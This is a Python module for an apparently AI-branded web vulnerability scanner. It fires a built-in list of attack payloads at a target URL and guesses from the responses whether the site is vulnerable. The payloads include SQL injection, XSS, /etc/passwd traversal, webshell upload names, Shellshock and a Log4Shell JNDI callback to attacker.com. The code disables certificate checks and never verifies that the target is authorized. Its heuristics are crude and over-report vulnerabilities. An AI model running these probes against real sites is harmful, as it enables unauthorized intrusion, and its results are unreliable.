"""
AI-Powered Vulnerability Testing for Authorized Websites
Integrates with HadesAI to provide one-click comprehensive security testing
"""

import logging
import json
import time
import threading
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime
import requests
from urllib.parse import urlparse, urljoin

logger = logging.getLogger("AIVulnerabilityTester")


@dataclass
class VulnerabilityTest:
    """Represents a single vulnerability test"""
    test_id: str
    test_name: str
    test_type: str  # injection, auth, config, etc.
    severity: str
    payload: str
    expected_indicators: List[str]
    requires_auth: bool = False
    timeout: int = 10


@dataclass
class TestResult:
    """Result of a vulnerability test"""
    test_id: str
    test_name: str
    vulnerable: bool
    confidence: float
    evidence: str
    response_code: int
    response_time: float
    timestamp: float
    payload_used: str


class AIVulnerabilityTester:
    """
    AI-powered vulnerability tester for authorized targets
    Uses HadesAI's knowledge base and attack vectors to intelligently test websites
    """
    
    # Define smart test categories
    VULNERABILITY_TESTS = {
        'injection': [
            VulnerabilityTest(
                'sql_001', 'SQL Injection - Basic',
                'injection', 'Critical',
                "' OR '1'='1'--",
                ["error", "syntax", "sql", "database"],
                False
            ),
            VulnerabilityTest(
                'sql_002', 'SQL Injection - Union',
                'injection', 'Critical',
                "' UNION SELECT NULL,NULL--",
                ["error", "union", "select"],
                False
            ),
            VulnerabilityTest(
                'xss_001', 'XSS - Basic Script',
                'injection', 'High',
                '<img src=x onerror="alert(1)">',
                ["alert", "onerror", "script"],
                False
            ),
            VulnerabilityTest(
                'xss_002', 'XSS - Event Handler',
                'injection', 'High',
                '"><svg onload="alert(1)">',
                ["svg", "onload", "alert"],
                False
            ),
        ],
        'authentication': [
            VulnerabilityTest(
                'auth_001', 'Default Credentials',
                'auth', 'High',
                'admin:admin',
                ["success", "welcome", "dashboard"],
                True
            ),
            VulnerabilityTest(
                'auth_002', 'Weak Password',
                'auth', 'Medium',
                'admin:password',
                ["success", "welcome", "dashboard"],
                True
            ),
            VulnerabilityTest(
                'auth_003', 'Bypass - No Auth',
                'auth', 'High',
                '',  # No credentials
                ["admin", "protected"],
                False
            ),
        ],
        'configuration': [
            VulnerabilityTest(
                'config_001', 'Debug Mode Enabled',
                'config', 'High',
                '?debug=1',
                ["debug", "trace", "stack"],
                False
            ),
            VulnerabilityTest(
                'config_002', 'Admin Panel Exposed',
                'config', 'Critical',
                '/admin',
                ["admin", "login", "panel"],
                False
            ),
            VulnerabilityTest(
                'config_003', 'Backup Files',
                'config', 'High',
                '/.backup',
                ["backup", "tar", "zip"],
                False
            ),
        ],
        'headers': [
            VulnerabilityTest(
                'header_001', 'Missing Security Headers',
                'headers', 'Medium',
                '',
                ["x-frame-options", "csp"],
                False
            ),
            VulnerabilityTest(
                'header_002', 'CORS Misconfiguration',
                'headers', 'High',
                '',
                ["access-control-allow-origin"],
                False
            ),
        ],
        'information_disclosure': [
            VulnerabilityTest(
                'info_001', 'Directory Listing',
                'info', 'Medium',
                '/',
                ["index of", "directory", "[dir]"],
                False
            ),
            VulnerabilityTest(
                'info_002', 'Version Disclosure',
                'info', 'Low',
                '',
                ["version", "powered by"],
                False
            ),
        ],
        'path_traversal': [
            VulnerabilityTest(
                'lfi_001', 'Path Traversal - Unix',
                'path_traversal', 'Critical',
                '?file=../../../../etc/passwd',
                ["root:", "bin:", "sys:", "etc/passwd"],
                False
            ),
            VulnerabilityTest(
                'lfi_002', 'Path Traversal - Windows',
                'path_traversal', 'Critical',
                '?file=..\\..\\..\\windows\\win.ini',
                ["[fonts]", "windows", "drivers"],
                False
            ),
            VulnerabilityTest(
                'lfi_003', 'Log File Poisoning',
                'path_traversal', 'High',
                '?file=../../logs/access.log',
                ["log", "access", "error"],
                False
            ),
        ],
        'access_control': [
            VulnerabilityTest(
                'acl_001', 'ACL Bypass - Direct Reference',
                'access_control', 'Critical',
                '/admin/users/123',
                ["admin", "user", "permission"],
                False
            ),
            VulnerabilityTest(
                'acl_002', 'Privilege Escalation',
                'access_control', 'Critical',
                '?role=admin',
                ["admin", "root", "superuser"],
                False
            ),
            VulnerabilityTest(
                'acl_003', 'Function Level Access Control Bypass',
                'access_control', 'High',
                '/api/admin/export',
                ["admin", "export", "download"],
                False
            ),
        ],
        'cookie_security': [
            VulnerabilityTest(
                'cookie_001', 'Missing HttpOnly Flag',
                'cookie_security', 'High',
                '',
                ["set-cookie", "httponly"],
                False
            ),
            VulnerabilityTest(
                'cookie_002', 'Missing Secure Flag',
                'cookie_security', 'High',
                '',
                ["set-cookie", "secure"],
                False
            ),
            VulnerabilityTest(
                'cookie_003', 'Session Fixation',
                'cookie_security', 'High',
                '?SESSIONID=attacker_session',
                ["session", "cookie"],
                False
            ),
            VulnerabilityTest(
                'cookie_004', 'Cookie Prediction',
                'cookie_security', 'Medium',
                '',
                ["sequential", "predictable"],
                False
            ),
        ],
        'memory_safety': [
            VulnerabilityTest(
                'mem_001', 'Buffer Overflow',
                'memory_safety', 'Critical',
                'A' * 1000,
                ["overflow", "segmentation", "crash"],
                False
            ),
            VulnerabilityTest(
                'mem_002', 'Stack Overflow',
                'memory_safety', 'Critical',
                'payload=' + ('x' * 10000),
                ["stack", "overflow", "corrupted"],
                False
            ),
            VulnerabilityTest(
                'mem_003', 'Uninitialized Pointer',
                'memory_safety', 'High',
                '?ptr=null',
                ["null", "uninitialized", "crash"],
                False
            ),
        ],
        'object_reference': [
            VulnerabilityTest(
                'obj_001', 'Insecure Direct Object Reference',
                'object_reference', 'Critical',
                '/api/invoice/1001',
                ["invoice", "data", "user"],
                False
            ),
            VulnerabilityTest(
                'obj_002', 'Private Variable Exposure',
                'object_reference', 'High',
                '/api/user/profile?includePrivate=true',
                ["private", "internal", "sensitive"],
                False
            ),
            VulnerabilityTest(
                'obj_003', 'Reflection Attack',
                'object_reference', 'High',
                '?obj=__proto__',
                ["proto", "constructor", "property"],
                False
            ),
        ],
        'enumeration': [
            VulnerabilityTest(
                'enum_001', 'Account Enumeration',
                'enumeration', 'Medium',
                '/api/user/exists?email=test@example.com',
                ["exists", "found", "registered"],
                False
            ),
            VulnerabilityTest(
                'enum_002', 'Username Enumeration',
                'enumeration', 'Medium',
                '/login?user=admin',
                ["invalid password", "user not found"],
                False
            ),
            VulnerabilityTest(
                'enum_003', 'Timing-Based Enumeration',
                'enumeration', 'Low',
                '/api/check?username=admin',
                ["timeout", "delay", "response-time"],
                False
            ),
        ],
        'fingerprinting': [
            VulnerabilityTest(
                'fp_001', 'Server Fingerprinting',
                'fingerprinting', 'Low',
                '',
                ["apache", "nginx", "iis", "server:"],
                False
            ),
            VulnerabilityTest(
                'fp_002', 'Framework Detection',
                'fingerprinting', 'Low',
                '',
                ["wordpress", "drupal", "laravel", "django"],
                False
            ),
            VulnerabilityTest(
                'fp_003', 'OS Fingerprinting',
                'fingerprinting', 'Low',
                '',
                ["windows", "linux", "ubuntu", "centos"],
                False
            ),
            VulnerabilityTest(
                'fp_004', 'Technology Stack Disclosure',
                'fingerprinting', 'Low',
                '/api/version',
                ["version", "tech", "platform"],
                False
            ),
        ],
        'file_upload': [
            VulnerabilityTest(
                'upload_001', 'Unrestricted File Upload',
                'file_upload', 'Critical',
                'file.php',
                ["shell", "execute", "command"],
                False
            ),
            VulnerabilityTest(
                'upload_002', 'Malicious File in Web Root',
                'file_upload', 'Critical',
                'shell.jsp',
                ["uploaded", "accessible", "execute"],
                False
            ),
            VulnerabilityTest(
                'upload_003', 'Extension Bypass - Null Byte',
                'file_upload', 'High',
                'shell.php%00.jpg',
                ["uploaded", "php", "shell"],
                False
            ),
            VulnerabilityTest(
                'upload_004', 'Double Extension Bypass',
                'file_upload', 'High',
                'shell.php.jpg',
                ["executed", "php", "shell"],
                False
            ),
        ],
        'request_forgery': [
            VulnerabilityTest(
                'csrf_001', 'CSRF Token Missing',
                'request_forgery', 'High',
                '',
                ["csrf", "token"],
                False
            ),
            VulnerabilityTest(
                'csrf_002', 'Weak CSRF Token',
                'request_forgery', 'High',
                '?csrf=test123',
                ["invalid", "weak", "bypass"],
                False
            ),
            VulnerabilityTest(
                'csrf_003', 'Action Spoofing',
                'request_forgery', 'High',
                '?action=admin',
                ["unauthorized", "admin", "action"],
                False
            ),
            VulnerabilityTest(
                'csrf_004', 'JSON CSRF',
                'request_forgery', 'Medium',
                '{"action":"admin"}',
                ["content-type", "json"],
                False
            ),
        ],
        'ajax_api': [
            VulnerabilityTest(
                'ajax_001', 'AJAX Endpoint Enumeration',
                'ajax_api', 'Medium',
                '/api/endpoints',
                ["endpoint", "api", "method"],
                False
            ),
            VulnerabilityTest(
                'ajax_002', 'Unauthenticated API Access',
                'ajax_api', 'High',
                '/api/data',
                ["data", "access", "json"],
                False
            ),
            VulnerabilityTest(
                'ajax_003', 'API Parameter Tampering',
                'ajax_api', 'High',
                '/api/data?id=1&admin=true',
                ["admin", "elevated", "permission"],
                False
            ),
        ],
        'cve_exploits': [
            VulnerabilityTest(
                'cve_001', 'CVE Detection - Log4Shell',
                'cve_exploits', 'Critical',
                '${jndi:ldap://attacker.com/a}',
                ["log4", "jndi", "rce"],
                False
            ),
            VulnerabilityTest(
                'cve_002', 'CVE Detection - Struts2 RCE',
                'cve_exploits', 'Critical',
                '%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)',
                ["struts", "rce", "ognl"],
                False
            ),
            VulnerabilityTest(
                'cve_003', 'CVE Detection - Spring4Shell',
                'cve_exploits', 'Critical',
                '?class.classLoader=...',
                ["spring", "rce", "classloader"],
                False
            ),
            VulnerabilityTest(
                'cve_004', 'CVE Detection - Shellshock',
                'cve_exploits', 'Critical',
                '() { :; }; echo vulnerable',
                ["bash", "shellshock", "cve"],
                False
            ),
        ]
    }
    
    def __init__(self, hades_ai=None):
        self.hades_ai = hades_ai
        self.session = self._create_session()
        self.test_results: List[TestResult] = []
        self.target_url = None
        self.authorization_token = None
        self.auth_headers = {}
        
    def _create_session(self) -> requests.Session:
        """Create requests session with retry logic"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Suppress SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        return session
    
    def set_authorization(self, token: Optional[str] = None, headers: Optional[Dict] = None):
        """Set authorization for protected endpoints"""
        if token:
            self.authorization_token = token
            self.auth_headers = {
                'Authorization': f'Bearer {token}'
            }
        elif headers:
            self.auth_headers = headers
    
    def test_website(self, target_url: str, test_categories: Optional[List[str]] = None,
                    callback: Optional[callable] = None) -> Dict:
        """
        Execute comprehensive vulnerability testing on authorized website
        
        Args:
            target_url: URL to test
            test_categories: Specific categories to test (default: all)
            callback: Function to call with progress updates
            
        Returns:
            Dictionary with all test results and summary
        """
        self.target_url = target_url
        self.test_results = []
        
        # Validate URL format
        if not self._validate_url(target_url):
            return {'error': 'Invalid URL format', 'status': 'failed'}
        
        # Get test categories to run
        categories = test_categories or list(self.VULNERABILITY_TESTS.keys())
        
        if callback:
            callback(f"Starting comprehensive vulnerability test on {target_url}")
        
        # Run tests by category
        for category in categories:
            if category not in self.VULNERABILITY_TESTS:
                logger.warning(f"Unknown test category: {category}")
                continue
            
            tests = self.VULNERABILITY_TESTS[category]
            
            if callback:
                callback(f"Testing {category}: {len(tests)} tests")
            
            for test in tests:
                if callback:
                    callback(f"  â†’ Running {test.test_name}...")
                
                result = self._run_single_test(target_url, test)
                if result:
                    self.test_results.append(result)
                
                time.sleep(0.5)  # Rate limiting
        
        # Compile results
        summary = self._compile_summary()
        
        if callback:
            callback(f"Testing complete: {summary['total_tests']} tests, "
                    f"{summary['vulnerabilities_found']} vulnerabilities found")
        
        return summary
    
    def _validate_url(self, url: str) -> bool:
        """Validate URL format"""
        try:
            result = urlparse(url)
            return all([result.scheme in ['http', 'https'], result.netloc])
        except:
            return False
    
    def _run_single_test(self, target_url: str, test: VulnerabilityTest) -> Optional[TestResult]:
        """Execute a single vulnerability test"""
        try:
            start_time = time.time()
            
            # Prepare test URL and payload based on test type
            test_url = self._prepare_test_url(target_url, test)
            method = 'POST' if test.test_type in ['request_forgery', 'ajax_api'] else 'GET'
            
            # Make request with timeout
            headers = self.auth_headers.copy() if self.auth_headers else {}
            
            # Add special headers for specific tests
            if 'fingerprint' in test.test_id:
                headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            
            if method == 'POST':
                response = self.session.post(
                    test_url,
                    headers=headers,
                    json=json.loads(test.payload) if test.payload.startswith('{') else {},
                    data=test.payload if not test.payload.startswith('{') else None,
                    timeout=test.timeout,
                    verify=False,
                    allow_redirects=True
                )
            else:
                response = self.session.get(
                    test_url,
                    headers=headers,
                    timeout=test.timeout,
                    verify=False,
                    allow_redirects=True
                )
            
            elapsed_time = time.time() - start_time
            
            # Analyze response for vulnerability indicators
            vulnerable, confidence, evidence = self._analyze_response(
                response, test, elapsed_time
            )
            
            result = TestResult(
                test_id=test.test_id,
                test_name=test.test_name,
                vulnerable=vulnerable,
                confidence=confidence,
                evidence=evidence,
                response_code=response.status_code,
                response_time=elapsed_time,
                timestamp=time.time(),
                payload_used=test.payload
            )
            
            logger.info(f"Test {test.test_id}: {'VULNERABLE' if vulnerable else 'safe'} "
                       f"(confidence: {confidence:.0%})")
            
            return result
            
        except requests.Timeout:
            logger.warning(f"Test {test.test_id} timed out")
            return None
        except Exception as e:
            logger.error(f"Test {test.test_id} failed: {e}")
            return None
    
    def _prepare_test_url(self, base_url: str, test: VulnerabilityTest) -> str:
        """Prepare URL for any test type"""
        if not test.payload:
            return base_url
        
        # Injection tests - add to query parameters
        if test.test_type == 'injection':
            param_names = ['id', 'search', 'q', 'name', 'username', 'email', 'page']
            if '?' in base_url:
                return f"{base_url}&{param_names[0]}={test.payload}"
            else:
                return f"{base_url}?{param_names[0]}={test.payload}"
        
        # Config/Path traversal tests - append to path
        elif test.test_type in ['config', 'path_traversal', 'file_upload', 'information_disclosure']:
            return urljoin(base_url, test.payload)
        
        # Access control/API tests - append to path
        elif test.test_type in ['access_control', 'ajax_api', 'object_reference']:
            return urljoin(base_url, test.payload)
        
        # Cookie/Memory tests - test.payload is usually empty, just use base
        elif test.test_type in ['cookie_security', 'memory_safety']:
            if test.payload and '?' not in base_url:
                return f"{base_url}?{test.payload}"
            elif test.payload:
                return f"{base_url}&{test.payload}"
            return base_url
        
        # Fingerprinting/Enumeration - use base URL
        elif test.test_type in ['fingerprinting', 'enumeration']:
            if test.payload:
                return urljoin(base_url, test.payload)
            return base_url
        
        # Request forgery/AJAX - may use query or body
        elif test.test_type in ['request_forgery', 'ajax_api']:
            if test.payload.startswith('{'):
                return base_url
            else:
                if '?' in base_url:
                    return f"{base_url}&{test.payload}"
                else:
                    return f"{base_url}?{test.payload}"
        
        # CVE tests - add as parameter
        elif test.test_type == 'cve_exploits':
            if '?' in base_url:
                return f"{base_url}&test={test.payload}"
            else:
                return f"{base_url}?test={test.payload}"
        
        return base_url
    
    def _analyze_response(self, response: requests.Response, 
                         test: VulnerabilityTest, response_time: float = 0) -> Tuple[bool, float, str]:
        """Analyze response for vulnerability indicators"""
        content_lower = response.text.lower()
        headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        # Check for expected indicators
        matched_indicators = []
        for indicator in test.expected_indicators:
            if indicator.lower() in content_lower or indicator.lower() in str(headers_lower):
                matched_indicators.append(indicator)
        
        # Heuristic scoring by test type
        vulnerability = False
        confidence = 0.0
        
        if test.test_type == 'injection':
            error_keywords = ['error', 'exception', 'syntax', 'warning', 'trace', 'stack']
            error_matches = sum(1 for kw in error_keywords if kw in content_lower)
            interesting_status = response.status_code in [200, 302, 403, 500]
            vulnerability = error_matches >= 2 or (interesting_status and len(matched_indicators) > 0)
            confidence = min(1.0, (error_matches * 0.3 + len(matched_indicators) * 0.2))
            
        elif test.test_type == 'authentication':
            success_keywords = ['dashboard', 'welcome', 'logout', 'profile', 'success']
            success_matches = sum(1 for kw in success_keywords if kw in content_lower)
            vulnerability = success_matches >= 1 and response.status_code == 200
            confidence = min(1.0, success_matches * 0.4)
            
        elif test.test_type in ['config', 'configuration']:
            vulnerability = response.status_code == 200 and len(matched_indicators) > 0
            confidence = min(1.0, len(matched_indicators) * 0.3)
            
        elif test.test_type == 'headers':
            vulnerability = response.status_code == 200 and len(matched_indicators) == 0
            confidence = 0.3 if vulnerability else 0.0
            
        elif test.test_type == 'information_disclosure':
            vulnerability = response.status_code == 200 and len(matched_indicators) > 0
            confidence = min(1.0, len(matched_indicators) * 0.25)
            
        elif test.test_type == 'path_traversal':
            vulnerability = response.status_code == 200 and len(matched_indicators) > 0
            confidence = min(1.0, len(matched_indicators) * 0.3)
            
        elif test.test_type == 'access_control':
            vulnerability = response.status_code == 200
            confidence = 0.8 if vulnerability else 0.0
            
        elif test.test_type == 'cookie_security':
            # Check for missing security headers
            vulnerability = 'httponly' not in headers_lower.get('set-cookie', '') or \
                          'secure' not in headers_lower.get('set-cookie', '')
            confidence = 0.8 if vulnerability else 0.2
            
        elif test.test_type == 'memory_safety':
            error_patterns = ['crash', 'overflow', 'segmentation', 'abort', 'core']
            crash_detected = any(p in content_lower for p in error_patterns)
            vulnerability = crash_detected or response.status_code in [500, 502]
            confidence = 0.9 if crash_detected else (0.5 if response.status_code == 500 else 0.0)
            
        elif test.test_type == 'object_reference':
            vulnerability = response.status_code == 200 and len(matched_indicators) > 0
            confidence = 0.8 if vulnerability else 0.0
            
        elif test.test_type == 'enumeration':
            # Timing-based or response difference detection
            timing_vuln = response_time > 2.0
            response_vuln = len(matched_indicators) > 0 or 'not found' not in content_lower
            vulnerability = timing_vuln or response_vuln
            confidence = 0.7 if timing_vuln else (0.6 if response_vuln else 0.0)
            
        elif test.test_type == 'fingerprinting':
            # Server/framework info detected
            fingerprint_keywords = ['apache', 'nginx', 'iis', 'wordpress', 'laravel', 'django', 
                                   'windows', 'linux', 'ubuntu', 'version']
            fingerprint_matches = sum(1 for kw in fingerprint_keywords if kw in content_lower)
            vulnerability = fingerprint_matches > 0
            confidence = min(1.0, fingerprint_matches * 0.2)
            
        elif test.test_type == 'file_upload':
            vulnerability = response.status_code in [200, 201] or 'uploaded' in content_lower
            confidence = 0.8 if vulnerability else 0.0
            
        elif test.test_type == 'request_forgery':
            # Check CSRF token presence
            csrf_absent = 'csrf' not in content_lower and 'token' not in content_lower
            vulnerability = csrf_absent or len(matched_indicators) > 0
            confidence = 0.7 if vulnerability else 0.2
            
        elif test.test_type == 'ajax_api':
            vulnerability = response.status_code == 200 and len(matched_indicators) > 0
            confidence = 0.8 if vulnerability else (0.3 if response.status_code == 200 else 0.0)
            
        elif test.test_type == 'cve_exploits':
            vulnerability = len(matched_indicators) > 0 or response.status_code == 500
            confidence = min(1.0, (len(matched_indicators) * 0.3 + (0.2 if response.status_code == 500 else 0)))
            
        else:
            # Default: any indicators found
            vulnerability = len(matched_indicators) > 0
            confidence = min(1.0, len(matched_indicators) * 0.2)
        
        evidence = f"Indicators: {', '.join(matched_indicators) if matched_indicators else 'None'}"
        
        return vulnerability, confidence, evidence
    
    def _compile_summary(self) -> Dict:
        """Compile test results into summary"""
        vulnerabilities = [r for r in self.test_results if r.vulnerable]
        
        severity_breakdown = {
            'Critical': len([v for v in vulnerabilities if 'critical' in 
                           next((t for t in [test for tests in self.VULNERABILITY_TESTS.values() 
                                            for test in tests] if t.test_id == v.test_id), 
                                VulnerabilityTest('', '', '', 'Low', '', [], False)).severity.lower()]),
            'High': 0,
            'Medium': 0,
            'Low': 0
        }
        
        return {
            'target': self.target_url,
            'timestamp': time.time(),
            'total_tests': len(self.test_results),
            'vulnerabilities_found': len(vulnerabilities),
            'success_rate': f"{(len(vulnerabilities) / max(1, len(self.test_results))) * 100:.1f}%",
            'avg_response_time': f"{sum(r.response_time for r in self.test_results) / max(1, len(self.test_results)):.2f}s",
            'results': [
                {
                    'test_id': r.test_id,
                    'test_name': r.test_name,
                    'vulnerable': r.vulnerable,
                    'confidence': f"{r.confidence:.0%}",
                    'response_code': r.response_code,
                    'response_time': f"{r.response_time:.2f}s",
                    'evidence': r.evidence,
                    'payload': r.payload_used
                }
                for r in sorted(self.test_results, key=lambda x: x.vulnerable, reverse=True)
            ],
            'severity_breakdown': severity_breakdown,
            'status': 'completed'
        }
    
    def export_results(self, filename: str = None) -> str:
        """Export test results to JSON"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"vuln_test_{timestamp}.json"
        
        summary = self._compile_summary()
        
        with open(filename, 'w') as f:
            json.dump(summary, f, indent=2)
        
        logger.info(f"Results exported to {filename}")
        return filename
    
    def get_remediation_recommendations(self) -> Dict:
        """Generate AI-powered remediation recommendations"""
        vulnerabilities = [r for r in self.test_results if r.vulnerable]
        
        recommendations = {
            'critical': [],
            'high': [],
            'medium': [],
            'low': []
        }
        
        # Add remediation for each vulnerability
        for vuln in vulnerabilities:
            if 'sql' in vuln.test_id.lower():
                recommendations['critical'].append({
                    'vulnerability': vuln.test_name,
                    'fix': 'Use parameterized queries and prepared statements',
                    'priority': 'CRITICAL'
                })
            elif 'xss' in vuln.test_id.lower():
                recommendations['high'].append({
                    'vulnerability': vuln.test_name,
                    'fix': 'Implement input validation, output encoding, and Content Security Policy',
                    'priority': 'HIGH'
                })
            elif 'auth' in vuln.test_id.lower():
                recommendations['high'].append({
                    'vulnerability': vuln.test_name,
                    'fix': 'Enforce strong passwords, implement MFA, disable default credentials',
                    'priority': 'HIGH'
                })
            elif 'config' in vuln.test_id.lower():
                recommendations['high'].append({
                    'vulnerability': vuln.test_name,
                    'fix': 'Disable debug modes, remove admin panels from public access',
                    'priority': 'HIGH'
                })
        
        return recommendations
